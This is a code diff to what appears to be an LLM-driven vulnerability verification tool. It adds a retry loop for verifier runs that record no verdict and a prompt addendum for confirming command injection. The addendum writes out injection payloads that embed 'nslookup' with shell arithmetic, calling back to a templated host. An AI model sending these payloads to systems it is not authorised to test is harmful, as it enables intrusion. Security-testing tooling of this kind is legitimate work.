@@ -23,6 +23,8 @@ from urllib.parse import parse_qsl, urlsplit, urlunsplit
 
 
 VERDICTS = ("pending", "confirmed", "refuted", "inconclusive")
+# Fresh verifier runs allowed when a run ends without recording any verdict.
+MAX_VERIFIER_ATTEMPTS = 2
 
 
 @dataclass
@@ -508,6 +510,19 @@ def publication_invariants(
     return True, "publication_trace_ok"
 
 
+COMMAND_INJECTION_VERIFIER_ADDENDUM = (
+    "This is a command injection candidate. A callback to the canary alone is NOT "
+    "proof: ping/webhook features and traffic-scanning proxies resolve supplied hosts. "
+    "Prove execution with a shell-evaluated label: run_oob_callback_workflow with "
+    "location=query_template (or the matching body location) and a value such as "
+    "`x;nslookup $((7919*13)).{{callback_host}}` or `$(nslookup $((7919*13)).{{callback_host}})`. "
+    "The computed label (here 102947) must reach the callback and must not appear "
+    "literally in the request. Record proof {kind: oob_callback, register_id, plant_id, "
+    "poll_id, evaluated_label: \"102947\"}. A callback without the computed label, or a "
+    "Windows-only target, stays inconclusive with that gap."
+)
+
+
 def parse_verdict_from_text(text: str) -> str:
     blob = (text or "").lower()
     if re.search(r"\b(verdict\s*[:=]\s*)?(refuted|false positive|not exploitable|killed)\b", blob):
@@ -574,8 +589,10 @@ def verifier_mission(candidate: FindingCandidate, *, threat_slice: str = "") -> 
 
     if is_oob_finding(packet):
         addenda.append(INTERACTSH_VERIFIER_ADDENDUM)
-    class_addendum = ("\n\n" + "\n\n".join(addenda)) if addenda else ""
     claim_class = candidate.vulnerability_class or inferred_vulnerability_class(candidate)
+    if claim_class == "command_injection":
+        addenda.append(COMMAND_INJECTION_VERIFIER_ADDENDUM)
+    class_addendum = ("\n\n" + "\n\n".join(addenda)) if addenda else ""
     proof_options = ", ".join(sorted(PROOFS_BY_CLASS.get(claim_class, ()))) or "none yet"
 
     return (
@@ -722,14 +739,35 @@ async def run_independent_verifiers(
                 replayed = await _verify_scoped_xml_xxe_candidate(tools_manager, cand, run)
                 if replayed is not None:
                     return replayed
-                report = await _run_specialist(
-                    profile, mission, [cand.target], llm, tools_manager,
-                )
-                live = _candidate(_brain(tools_manager), cand.id)
+                # A verifier that ends without record_verify_verdict (model error,
+                # timeout, narrative-only answer) has not judged the claim. Give it
+                # one fresh run before settling; each attempt has its own run id, so
+                # evidence from a failed attempt cannot confirm the retry.
+                attempts = 0
+                while True:
+                    attempts += 1
+                    report = await _run_specialist(
+                        profile, mission, [cand.target], llm, tools_manager,
+                    )
+                    live = _candidate(_brain(tools_manager), cand.id)
+                    if (not live or live.status != "pending"
+                            or attempts >= MAX_VERIFIER_ATTEMPTS):
+                        break
+                    verification_run.reset(token)
+                    run = VerificationRun(uuid.uuid4().hex, cand.id, cand.revision, cand.nonce)
+                    token = verification_run.set(run)
                 if live and live.status == "pending":
                     # Narrative text cannot promote a candidate to confirmed.
-                    apply_verdict(tools_manager, candidate_id=cand.id, verdict="inconclusive",
-                                  evidence="Verifier did not record a supported verdict")
+                    gap = (f"Verifier recorded no verdict after {attempts} attempt"
+                           f"{'s' if attempts != 1 else ''}")
+                    if report.error:
+                        gap += f" (last error: {str(report.error)[:200]})"
+                    apply_verdict(
+                        tools_manager, candidate_id=cand.id, verdict="inconclusive",
+                        evidence=gap, summary=gap,
+                        proof={"next_step": "Re-run the verifier or reproduce the "
+                                            "claimed request manually; the claim was not judged"},
+                    )
                     live = _candidate(_brain(tools_manager), cand.id)
             finally:
                 verification_run.reset(token)
@@ -740,6 +778,7 @@ async def run_independent_verifiers(
                 "verifier_summary": (report.summary or "")[:1500],
                 "key_findings": list(report.key_findings or [])[:8],
                 "tool_calls": len(report.tool_calls or []),
+                "verifier_attempts": attempts,
                 "error": report.error,
             }
 
